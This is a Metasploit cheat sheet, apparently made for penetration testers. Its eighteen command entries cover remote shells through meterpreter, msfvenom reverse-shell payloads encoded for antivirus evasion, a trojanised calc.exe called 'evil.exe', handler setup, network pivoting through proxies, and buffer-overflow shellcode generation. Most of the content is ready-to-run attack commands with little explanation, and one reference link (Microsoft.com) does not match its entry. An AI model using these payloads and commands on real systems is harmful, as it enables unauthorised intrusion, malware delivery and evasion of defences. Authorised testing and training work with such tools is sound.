### 1. executes a command on the remote machine (i.e. opens up a command shell)
```
meterpreter> execute -f cmd.exe -i -H
```
**- metasploit**
#### References:

https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
__________
### 2. MSF Venom make dll
```
./msfvenom -p windows/meterpreter/reverse_https -f dll -e x86/shikata_ga_nai -i 30 LHOST=[IP] LPORT=443 > /data/Clients/[FILE]
```
**- metasploit,av evasion**
#### References:

https://www.offensive-security.com/metasploit-unleashed/msfvenom/
__________
### 3. proxy Metasploit pivot
```
run autoroute -s [CIDR SUBNET]
```
**- pivoting,metasploit**
#### References:

http://Microsoft.com
__________
### 4. proxy metasploit pivot
```
run autoroute -p
```
**- pivoting,metasploit**
#### References:

https://www.offensive-security.com/metasploit-unleashed/pivoting/
__________
### 5. proxy Metasploit pivot
```
background it then run...
```
**- pivoting,metasploit**
#### References:

https://www.offensive-security.com/metasploit-unleashed/pivoting/
__________
### 6. proxy Metasploit pivot
```
use auxiliary/server/socks4a
```
**- pivoting,metasploit**
#### References:

https://www.offensive-security.com/metasploit-unleashed/pivoting/
__________
### 7. proxy pivot
```
proxychains cmd
```
**- pivoting,metasploit**
#### References:

http://proxychains.sourceforge.net/
https://www.offensive-security.com/metasploit-unleashed/proxytunnels/
__________
### 8. MSFConsole hints
```
use multi/handler
```
**- metasploit**
#### References:

https://www.offensive-security.com/metasploit-unleashed/binary-payloads/
__________
### 9. MSFConsole hints
```
set PAYLOAD windows/meterpreter/reverse_https
```
**- metasploit**
#### References:

https://www.offensive-security.com/metasploit-unleashed/binary-payloads/
__________
### 10. MSFConsole hints
```
set LHOST [IP]
```
**- metasploit**
#### References:

https://www.offensive-security.com/metasploit-unleashed/binary-payloads/
__________
### 11. MSFConsole hints
```
set LPORT 443
```
**- metasploit**
#### References:

https://www.offensive-security.com/metasploit-unleashed/binary-payloads/
__________
### 12. MSFConsole hints
```
set ExitOnSession false
```
**- metasploit**
#### References:

https://www.offensive-security.com/metasploit-unleashed/binary-payloads/
__________
### 13. MSFConsole hints
```
exploit -j
```
**- metasploit**
#### References:

https://www.offensive-security.com/metasploit-unleashed/binary-payloads/
__________
### 14. powershell shell
```
msfvenom -p Windows/meterpreter/reverse_https -f psh -a x86 LHOST=[lhost] LPORT=[lport] audit.ps1
```
**- metasploit,av evasion,powershell**
#### References:

https://www.offensive-security.com/metasploit-unleashed/msfvenom/
__________
### 15. create a evil calc
```
msfvenom --payload windows/meterpreter/reverse_tcp --format exe --template calc.exe -k --encoder x86/shikata_ga_ni -i 5 LHOST=[lhost] LPORT=[lport] evil.exe
```
**- metasploit,av evasion**
#### References:

https://www.offensive-security.com/metasploit-unleashed/msfvenom/
__________
### 16. create a patern of 2700 bytes to isolate the buffer size you have, part of msf, look for value of EIP 
```
pattern_create.rb -l 2700
```
**- metasploit,buffer overflow**
#### References:

https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/
https://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit
__________
### 17. Get the exact offset for the EIP
```
pattern_offset.rb -l 2700 -q [EIP]
```
**- metasploit,buffer overflow**
#### References:

https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/
https://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit
__________
### 18. Create shellcode which connects back on port can add –e x86/shikata_ga_nai, -b is bad chars
```
msfvenom -p windows/shell_reverse_tcp LHOST=[LIP] LPORT=[LPORT] -f c -b "\x00" 
```
**- metasploit,buffer overflow**
#### References:

https://www.offensive-security.com/metasploit-unleashed/msfvenom/
https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/
__________
